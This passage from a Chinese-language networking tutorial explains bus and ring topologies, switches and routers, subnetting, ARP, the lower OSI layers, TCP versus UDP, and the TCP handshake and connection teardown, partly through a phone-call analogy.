&lt;p&gt;由于此拓扑需要更多的布线和购买专用网络设备，因此它比任何其他拓扑都更昂贵。然而，尽管成本增加，但这确实提供了一些显着的优势。例如，这种拓扑本质上更具可扩展性，这意味着随着网络需求的增加，很容易添加更多设备。&lt;/p&gt;
&lt;p&gt;遗憾的是，网络规模越大，保持网络正常运行所需的维护就越多。这种对维护的依赖增加也会使故障排除变得更加困难。此外，星形拓扑结构仍然容易出现故障 - 尽管有所减少。例如，如果连接设备的集中式硬件发生故障，这些设备将无法再发送或接收数据。值得庆幸的是，这些集中式硬件设备通常很强大。&lt;/p&gt;
&lt;h3 id=&#34;总线拓扑&#34;&gt;总线拓扑
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171103707.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171103707&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这种类型的连接依赖于称为主干电缆的单个连接。这种类型的拓扑类似于树的叶子，因为设备（叶子）从此电缆上的树枝所在的位置开始。&lt;/p&gt;
&lt;p&gt;由于发往每个设备的所有数据都沿着同一根电缆传输，因此如果拓扑中的设备同时请求数据，则很快就会变得缓慢和瓶颈。这种瓶颈还会导致非常困难的故障排除，因为很快就会变得难以识别哪个设备遇到了问题，所有数据都沿着同一路径传输。&lt;/p&gt;
&lt;p&gt;然而，话虽如此，总线拓扑是更容易设置且更具成本效益的拓扑之一，因为它们需要花费，例如用于连接这些设备的布线或专用网络设备。&lt;/p&gt;
&lt;p&gt;最后，总线拓扑的另一个缺点是，在发生故障时几乎没有冗余。这个缺点是因为沿主干电缆存在单点故障。如果此电缆断开，设备将无法再沿总线接收或传输数据。&lt;/p&gt;
&lt;h3 id=&#34;环形拓扑&#34;&gt;环形拓扑
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171139146.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171139146&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;环形拓扑（也称为令牌拓扑）具有一些相似之处。计算机等设备直接相互连接以形成一个环路，这意味着几乎不需要布线，并且对专用硬件（例如在星形拓扑中）的依赖较小。&lt;/p&gt;
&lt;p&gt;环形拓扑的工作原理是跨循环发送数据，直到数据到达目标设备，并使用循环中的其他设备转发数据。有趣的是，如果设备没有要发送的数据，则它只会从此拓扑中的另一台设备发送接收到的数据。如果设备恰好有数据要发送，它将先发送自己的数据，然后再从另一台设备发送数据。&lt;/p&gt;
&lt;p&gt;由于数据只有一个方向可以穿过此拓扑，因此对出现的任何故障进行故障排除相当容易。然而，这是一把双刃剑，因为它不是一种有效的数据通过网络传输的方式，因为它可能必须先访问许多多个设备才能到达预期的设备。&lt;/p&gt;
&lt;p&gt;最后，环形拓扑不太容易出现瓶颈，例如在总线拓扑中，因为大量流量不会在任何时候通过网络传输。但是，这种拓扑的设计确实意味着诸如电缆切断或设备损坏等故障将导致整个网络中断。&lt;/p&gt;
&lt;h3 id=&#34;什么是交换机&#34;&gt;什么是交换机？
&lt;/h3&gt;&lt;p&gt;交换机是网络中的专用设备，旨在聚合多个其他设备，例如计算机、打印机或任何其他使用以太网的支持联网的设备。这些不同的设备插入交换机的端口。交换机通常位于较大的网络中，例如企业、学校或类似规模的网络，其中有许多设备可以连接到网络。交换机可以通过 4、8、16、24、32 和 64 端口来连接大量设备，以便设备插入。&lt;/p&gt;
&lt;p&gt;交换机比较小的同类产品（集线器/中继器）效率更高。交换机跟踪连接到哪个端口的设备。这样，当它们收到数据包时，它不会像集线器那样将该数据包重复到每个端口，而是将其发送到预期目标，从而减少网络流量。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171220337.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171220337&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;交换机和路由器都可以相互连接。这样做的能力通过为数据添加多个路径来增加网络的冗余（可靠性）。如果一条路径出现故障，则可以使用另一条路径。虽然这可能会降低网络的整体性能，因为数据包必须花费更长的时间来传输，但没有停机时间 - 考虑到替代方案，这是一个很小的代价。&lt;/p&gt;
&lt;h3 id=&#34;什么是路由器&#34;&gt;什么是路由器？
&lt;/h3&gt;&lt;p&gt;路由器的工作是连接网络并在它们之间传递数据。它通过使用路由来实现这一点（因此得名 router）&lt;/p&gt;
&lt;p&gt;路由是给跨网络传输数据的过程的标签。路由涉及在网络之间创建路径，以便成功传送此数据。&lt;/p&gt;
&lt;p&gt;当设备通过许多路径连接时，路由非常有用，如下面的示例图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171249840.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171249840&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;子网划分入门&#34;&gt;子网划分入门
&lt;/h2&gt;&lt;p&gt;正如我们之前在整个模块中讨论的那样，网络可以找到各种形状和大小 - 从小到大。子网划分是指将网络在其内部拆分为更小的微型网络。把它想象成为你的朋友切蛋糕。只有一定数量的蛋糕可以吃，但每个人都想分一杯羹。子网划分就是你决定谁得到什么份额，并保留这个比喻蛋糕的这样一块。&lt;/p&gt;
&lt;p&gt;以一家企业为例;您将拥有不同的部门，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;会计学&lt;/li&gt;
&lt;li&gt;金融&lt;/li&gt;
&lt;li&gt;人力资源&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171414964.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;虽然您知道在现实生活中将信息发送到正确的部门的位置，但网络也需要知道。网络管理员使用子网划分对网络的特定部分进行分类和分配，以反映这一点。&lt;/p&gt;
&lt;p&gt;子网划分是通过拆分网络可容纳的主机数量来实现的，该主机数由称为子网掩码的数字表示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171439472.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171439472&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;正如我们所记得的，IP 地址由四个称为八位字节的部分组成。子网掩码也是如此，它也表示为 4 个字节 （32 位） 的数字，范围从 0 到 255 （0-255）。&lt;/p&gt;
&lt;p&gt;子网以三种不同的方式使用 IP 地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确定网络地址&lt;/li&gt;
&lt;li&gt;确定主机地址&lt;/li&gt;
&lt;li&gt;确定默认网关&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;让我们将这三个部分分为下表以了解它们的用途：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;目的&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;解释&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;例&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;网络地址&lt;/td&gt;
          &lt;td&gt;此地址标识实际网络的起点，并用于标识网络的存在。&lt;/td&gt;
          &lt;td&gt;例如，IP 地址为 192.168.1.100 的设备将位于由 192.168.1.0 标识的网络上&lt;/td&gt;
          &lt;td&gt;192.168.1.0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;主机地址&lt;/td&gt;
          &lt;td&gt;此处的 IP 地址用于标识子网上的设备&lt;/td&gt;
          &lt;td&gt;例如，设备的网络地址为 192.168.1.1&lt;/td&gt;
          &lt;td&gt;192.168.1.100&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;默认网关&lt;/td&gt;
          &lt;td&gt;默认网关地址是分配给网络上设备的特殊地址，该地址能够将信息发送到另一个网络&lt;/td&gt;
          &lt;td&gt;任何需要发送到不在同一网络上的设备（即不在 192.168.1.0 上）的数据都将被发送到此设备。这些设备可以使用任何主机地址，但通常使用网络中的第一个或最后一个主机地址（.1 或 .254）&lt;/td&gt;
          &lt;td&gt;192.168.1.254&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;现在，在小型网络中，例如在家中，您将位于一个子网上，因为您一次需要连接超过 254 台设备的可能性不大。&lt;/p&gt;
&lt;p&gt;但是，企业和办公室等场所将拥有更多的此类设备（PC、打印机、相机和传感器），这些设备将进行子网划分。&lt;/p&gt;
&lt;p&gt;子网划分提供了一系列好处，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;效率&lt;/li&gt;
&lt;li&gt;安全&lt;/li&gt;
&lt;li&gt;完全控制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;稍后我们将继续探讨子网划分如何提供这些好处;但是，就目前而言，我们需要了解的只是它的安全元素。让我们以街上的典型咖啡馆为例。这家咖啡馆将有两个网络：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个用于员工、收银机和设施的其他设备&lt;/li&gt;
&lt;li&gt;一个供公众用作热点&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;子网划分允许您将这两个用例彼此分开，同时获得连接到更大网络（如 Internet）的好处。&lt;/p&gt;
&lt;h2 id=&#34;arp&#34;&gt;ARP
&lt;/h2&gt;&lt;p&gt;回顾我们之前的任务，设备可以有两个标识符：MAC 地址和 IP 地址，简称 A &lt;strong&gt;ddress&lt;/strong&gt; &lt;strong&gt;R&lt;/strong&gt;esolution &lt;strong&gt;P&lt;/strong&gt;rotocol 或简称 &lt;strong&gt;ARP&lt;/strong&gt;，是负责允许设备在网络上识别自己的技术。&lt;/p&gt;
&lt;p&gt;简单地说，ARP 允许设备将其 MAC 地址与网络上的 IP 地址相关联。网络上的每台设备都将保留与其他设备关联的 MAC 地址的日志。&lt;/p&gt;
&lt;p&gt;当设备希望与其他设备通信时，它们将向整个网络发送广播，以搜索特定设备。设备可以使用 ARP 查找设备的 MAC 地址（以及物理标识符）以进行通信。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ARP 是如何工作的？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;网络中的每个设备都有一个用于存储信息的分类账，称为缓存。在 &lt;strong&gt;ARP&lt;/strong&gt; 上下文中，此缓存存储网络上其他设备的标识符。&lt;/p&gt;
&lt;p&gt;为了将这两个标识符（IP 地址和 MAC 地址）映射在一起，ARP 发送两种类型的消息：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ARP （ARP）请求&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ARP （ARP）答&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;发送 &lt;strong&gt;ARP 请求&lt;/strong&gt;时，会在网络上向其他设备广播一条消息，询问“拥有此 IP 地址的 mac 地址是什么？当其他设备收到该消息时，它们只有在拥有该 IP 地址时才会响应，并将发送包含其 MAC 地址的 &lt;strong&gt;ARP 回复&lt;/strong&gt; 。请求设备现在可以记住此映射并将其存储在其 &lt;strong&gt;ARP 缓存&lt;/strong&gt;中以备将来使用。&lt;/p&gt;
&lt;p&gt;下图说明了此过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171530621.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171530621&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;osi模型&#34;&gt;OSI模型
&lt;/h2&gt;&lt;h3 id=&#34;什么是osi&#34;&gt;什么是OSI
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;OSI&lt;/strong&gt; 模型（或 &lt;strong&gt;O&lt;/strong&gt;pen &lt;strong&gt;S&lt;/strong&gt;ystems &lt;strong&gt;I&lt;/strong&gt;nterconnection 模型）是网络中使用的基本模型。 这个关键模型提供了一个框架，规定了所有联网设备将如何发送、接收和解释数据。&lt;/p&gt;
&lt;p&gt;OSI 模型的主要优点之一是，设备在与其他设备通信时可以在网络上具有不同的功能和设计。通过遵循 OSI 模型一致性的网络发送的数据可以被其他设备理解。&lt;/p&gt;
&lt;p&gt;OSI 模型由七层组成，如下图所示。每个层都有一组不同的职责，从第 7 层到第 1 层排列。&lt;/p&gt;
&lt;p&gt;在数据经过的每一层，都会发生特定的流程，并将信息添加到这些数据中，这就是我们将在本次会议中即将讨论的任务中讨论的内容。但是，现在，我们只需要了解此过程称为封装以及下图中 OSI 模型的外观：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171622222.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171622222&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;第一层-物理层&#34;&gt;第一层 物理层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171648102.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171648102&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;此层是最容易掌握的层之一。简单地说，此层引用网络中使用的硬件的物理组件，是您将找到的最低层。设备使用电信号在二进制编号系统（1 和 0）中相互传输数据。&lt;/p&gt;
&lt;p&gt;例如，连接设备的以太网电缆，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171656569.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171656569&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;第二层-数据链路层&#34;&gt;第二层 数据链路层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171741696.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171741696&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;数据链路层侧重于传输的物理寻址。它从网络层接收数据包（包括远程计算机的 IP 地址），并添加接收端点的物理 &lt;strong&gt;MAC&lt;/strong&gt;（媒体访问控制）地址。每台支持网络的计算机内部都有一个 &lt;strong&gt;N&lt;/strong&gt;etwork &lt;strong&gt;I&lt;/strong&gt;nterface Card （&lt;strong&gt;NIC），&lt;/strong&gt; 它带有一个唯一的 MAC 地址来识别它。&lt;/p&gt;
&lt;p&gt;MAC 地址由制造商设置并实际烧录到卡中;它们无法更改 - 尽管它们可以被欺骗。当信息通过网络发送时，它实际上是用于标识信息的确切发送位置的物理地址。&lt;/p&gt;
&lt;p&gt;此外，数据链路层的工作还包括以适合传输的格式呈现数据。&lt;/p&gt;
&lt;h3 id=&#34;第三层-网络层&#34;&gt;第三层 网络层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171800098.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171800098&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;OSI 模型的第三层（网络层）是路由和重新组装数据的魔力发生的地方（从这些小块到更大的块）。首先，路由只是确定这些数据块应发送到的最佳路径。&lt;/p&gt;
&lt;p&gt;虽然这一层的一些协议准确地确定了数据到达设备的 “最佳” 路径，但我们只能在网络模块的这个阶段知道它们的存在。简而言之，这些协议包括 &lt;strong&gt;OSPF&lt;/strong&gt; （&lt;strong&gt;O&lt;/strong&gt;pen &lt;strong&gt;S hortest&lt;/strong&gt; &lt;strong&gt;P&lt;/strong&gt;ath &lt;strong&gt;F&lt;/strong&gt;irst） 和 &lt;strong&gt;RIP&lt;/strong&gt; （&lt;strong&gt;R&lt;/strong&gt;outing &lt;strong&gt;I&lt;/strong&gt;nformation &lt;strong&gt;P&lt;/strong&gt;rotocol）。决定采用哪种路线的因素由以下因素决定：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;哪条路最短？即，数据包需要传输的设备数量最少。&lt;/li&gt;
&lt;li&gt;什么路径最可靠？即，数据包之前是否在该路径上丢失过？&lt;/li&gt;
&lt;li&gt;哪条路径的物理连接速度更快？即，一条路径是使用铜缆连接（较慢）还是光纤（相当快）？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在这一层，一切都通过 IP 地址处理，例如 192.168.1.100。能够使用 IP 地址传输数据包的设备（例如路由器）称为第 3 层设备，因为它们能够在 OSI 模型的第三层工作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171814647.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171814647&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;第四层--传输层&#34;&gt;第四层  传输层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171831749.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171831749&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;OSI 模型的第 4 层在通过网络传输数据方面起着至关重要的作用，可能有点难以掌握。在设备之间发送数据时，它遵循两种不同的协议之一，这些协议是根据几个因素决定的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCP 协议&lt;/li&gt;
&lt;li&gt;UDP 协议&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;让我们从 TCP 开始。&lt;strong&gt;T&lt;/strong&gt;ransmission &lt;strong&gt;C&lt;/strong&gt;ontrol &lt;strong&gt;P&lt;/strong&gt;rotocol （&lt;strong&gt;TCP）。&lt;/strong&gt; 顾名思义，该协议在设计时考虑了可靠性和保证。此协议在两个设备之间保留一个持续连接，用于发送和接收数据所需的时间。&lt;/p&gt;
&lt;p&gt;不仅如此，TCP 还将错误检查纳入其设计中。错误检查是 TCP 如何保证从会话层（第 5 层）中的小块发送的数据随后以相同的顺序接收和重组。&lt;/p&gt;
&lt;p&gt;让我们在下表中总结 TCP 的优缺点：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;**TCP 的优点 **&lt;/th&gt;
          &lt;th&gt;**TCP 的缺点 **&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;保证数据的准确性。&lt;/td&gt;
          &lt;td&gt;需要在两个设备之间建立可靠的连接。如果未收到一小块数据，则无法使用整个数据块。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;能够同步两个设备，以防止彼此被数据淹没。&lt;/td&gt;
          &lt;td&gt;慢速连接可能会给另一台设备带来瓶颈，因为连接将始终在接收计算机上保留。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;执行更多的过程以实现可靠性。&lt;/td&gt;
          &lt;td&gt;TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多工作。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;TCP 用于文件共享、Internet 浏览或发送电子邮件等情况。这种用法是因为这些服务要求数据准确和完整（拥有半个文件不好！&lt;/p&gt;
&lt;p&gt;在下图中，我们可以看到猫的图片是如何从 “webserver” 分解成小块数据（称为数据包）的，其中 “computer” 将猫的图片重新构建为正确的顺序。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171930198.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171930198&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;现在让我们进入 &lt;strong&gt;U&lt;/strong&gt;ser &lt;strong&gt;D&lt;/strong&gt;atagram &lt;strong&gt;P&lt;/strong&gt;rotocol（或简称 &lt;strong&gt;U&lt;strong&gt;&lt;strong&gt;D&lt;/strong&gt;&lt;/strong&gt;P&lt;/strong&gt;）。该协议不如它的兄弟 TCP 协议先进。它没有 TCP 提供的许多功能，例如错误检查和可靠性。事实上，通过 UDP 发送的任何数据都会发送到计算机，无论它是否到达那里。两个设备之间没有同步或保证;只是希望最好，手指交叉。&lt;/p&gt;
&lt;p&gt;虽然这听起来很不利，但它确实有其优点，我们将在下表中进行布局：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;UDP 的优势&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;UDP 的缺点&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 比 TCP 快得多。&lt;/td&gt;
          &lt;td&gt;UDP 不关心是否收到数据。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 让应用程序层（用户软件）决定是否可以控制数据包的发送速度。&lt;/td&gt;
          &lt;td&gt;从这个意义上说，它对软件开发人员来说是相当灵活的。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 不会像 TCP 那样在设备上保留连续连接。&lt;/td&gt;
          &lt;td&gt;这意味着不稳定的连接会给用户带来糟糕的体验。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;使用与之前相同的示例，我们现在可以看到“计算机”只接收了数据包 #1 和 #3，这意味着缺少一半的图像。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171943902.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171943902&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;UDP 在发送小块数据的情况下非常有用。&lt;/p&gt;
&lt;h4 id=&#34;tcp三次握手四次挥手&#34;&gt;TCP三次握手四次挥手
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;三次握手与四次挥手&lt;/strong&gt;是TCP协议中用于建立和终止连接的关键机制，确保数据传输的可靠性。以下是详细解释：&lt;/p&gt;
&lt;hr&gt;
&lt;h5 id=&#34;一三次握手建立连接&#34;&gt;&lt;strong&gt;一、三次握手（建立连接）&lt;/strong&gt;
&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;目的&lt;/strong&gt;：确保客户端与服务器双方具备收发数据的能力。
&lt;strong&gt;过程&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;SYN（客户端 → 服务器）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;客户端发送SYN报文（SYN=1，seq=x），进入&lt;code&gt;SYN_SENT&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：请求建立连接，并初始化序列号。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SYN-ACK（服务器 → 客户端）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;服务器回应SYN-ACK报文（SYN=1，ACK=1，ack=x+1，seq=y），进入&lt;code&gt;SYN_RCVD&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：确认收到请求，同时发送自身序列号。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACK（客户端 → 服务器）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;客户端发送ACK报文（ACK=1，ack=y+1，seq=x+1），双方进入&lt;code&gt;ESTABLISHED&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：确认服务器的响应，完成连接建立。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;为什么需要三次？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;防止已失效的请求报文突然传到服务器（如网络延迟导致重复SYN），避免资源浪费。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h5 id=&#34;二四次挥手终止连接&#34;&gt;&lt;strong&gt;二、四次挥手（终止连接）&lt;/strong&gt;
&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;目的&lt;/strong&gt;：确保双方数据收发完毕后再安全关闭连接。
&lt;strong&gt;过程&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;FIN（主动关闭方 → 被动关闭方）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;主动方（如客户端）发送FIN报文（FIN=1，seq=u），进入&lt;code&gt;FIN_WAIT_1&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：表示不再发送数据，但可接收数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACK（被动关闭方 → 主动关闭方）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;被动方回应ACK报文（ACK=1，ack=u+1，seq=v），进入&lt;code&gt;CLOSE_WAIT&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：确认收到关闭请求，但可能继续发送未完成的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;FIN（被动关闭方 → 主动关闭方）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;被动方发送FIN报文（FIN=1，ACK=1，ack=u+1，seq=w），进入&lt;code&gt;LAST_ACK&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：表示自身数据已发送完毕，请求关闭连接。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACK（主动关闭方 → 被动关闭方）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;主动方回应ACK报文（ACK=1，ack=w+1，seq=u+1），进入&lt;code&gt;TIME_WAIT&lt;/code&gt;状态（等待2MSL时间）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：确认最终关闭，防止最后一个ACK丢失导致被动方重传FIN。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;为什么需要四次？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCP是全双工通信，双方需独立关闭发送通道。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;三三次握手建立连接确保双方能正常通话&#34;&gt;&lt;strong&gt;三、三次握手：建立连接（确保双方能正常通话）&lt;/strong&gt;
&lt;/h5&gt;&lt;h6 id=&#34;场景小明想约小美商量聚会计划&#34;&gt;&lt;strong&gt;场景&lt;/strong&gt;：小明想约小美商量聚会计划。
&lt;/h6&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;第一次握手（SYN）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小明打电话给小美：“&lt;strong&gt;小美，你能听到我说话吗？&lt;/strong&gt;”（发送 SYN 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小明等待回应（&lt;code&gt;SYN_SENT&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二次握手（SYN-ACK）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小美接听电话：“&lt;strong&gt;小明，我能听到！你能听到我吗？&lt;/strong&gt;”（回复 SYN-ACK 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小美等待小明确认（&lt;code&gt;SYN_RCVD&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第三次握手（ACK）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小明回应：“&lt;strong&gt;我能听到！&lt;/strong&gt;”（发送 ACK 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：双方正式通话（&lt;code&gt;ESTABLISHED&lt;/code&gt;），开始讨论聚会细节（数据传输）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;为什么需要三次？&lt;/strong&gt;
如果小明喊完第一句后，小美没回应，小明会重拨（避免网络延迟导致重复连接）。三次确认确保双方 ​&lt;strong&gt;​“听得到”且“能回应”​&lt;/strong&gt;。&lt;/p&gt;
&lt;hr&gt;
